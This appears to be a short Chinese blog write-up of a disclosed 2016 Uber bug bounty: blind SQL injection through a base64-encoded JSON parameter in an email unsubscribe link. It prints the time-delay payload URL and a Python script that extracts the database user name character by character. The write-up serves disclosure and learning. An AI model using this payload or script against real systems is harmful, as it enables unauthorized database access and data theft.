# 漏洞散记
##  Uber的sql注入
> July 26, 2016 12:29发布的一个漏洞，一个json中存在的注入，我只能说作者真的很细心

> 漏洞价值:4000$

# 漏洞详情
很巧，作者当时正在大陆旅游，然后叫了大陆的uber，然后意外的收到了一个来自Uber的广告邮件，高潮的部分就这么
发生了！作者发现这封邮件的**unsubscribe link**和他以前见过的**unsubscribe link**不一样，然后便测试出此处
存在注入

> 这儿插一下，邮件的unsubscribe link最后的parameter是json格式的base64

作者提供payload如下：

```
http://sctrack.email.uber.com.cn/track/unsubscribe.do?p=eyJ1c2VyX2lkIjogIjU3NTUgYW5kIHNsZWVwKDEyKT0xIiwgInJlY2VpdmVyIjogIm9yYW5nZUBteW1haWwifQ==
```
将后半部分的base64解密后是：

```{"user_id": "5755 and sleep(12)=1", "receiver": "orange@mymail"}```

可以看到在user_id处存在注入，使用的是延时，作者发现此处执行成功，延时12s

便写了个脚本加以利用

### Script:

```python
import json
import string
import requests
from urllib import quote
from base64 import b64encode

base = string.digits + '_-@.'
payload = {"user_id": 5755, "receiver": "blog.orange.tw"}

for l in range(0, 30):
    for i in 'i'+base:
        payload['user_id'] = "5755 and mid(user(),%d,1)='%c'#"%(l+1, i)
        new_payload = json.dumps(payload)
        new_payload = b64encode(new_payload)
        r = requests.get('http://sctrack.email.uber.com.cn/track/unsubscribe.do?p='+quote(new_payload))

        if len(r.content)>0:
            print i
            break

```
利用脚本，成功dump出**database name**和**user name**

## 结语

这个漏洞属于sql的盲目注入，而且并没有做什么过滤，所以在利用难度上并没有很高超的技巧，然而这个漏洞的发现以及其
存在形式却是值得学习的地方，尤其是的直觉，在察觉到两种退订链接不同后便感觉出漏洞的存在，只能说是漏洞猎人独有的嗅觉

### 后续

在确认漏洞时，厂商不能确认该支付多少奖励，接着作者便提出了自己的另一个漏洞[#126203](https://hackerone.com/reports/126203)，厂商对比之后，
支付了作者4000$，感慨一句，Uber真的是壕破天，可惜当时我的那个洞被算作重复提交了，哭瞎
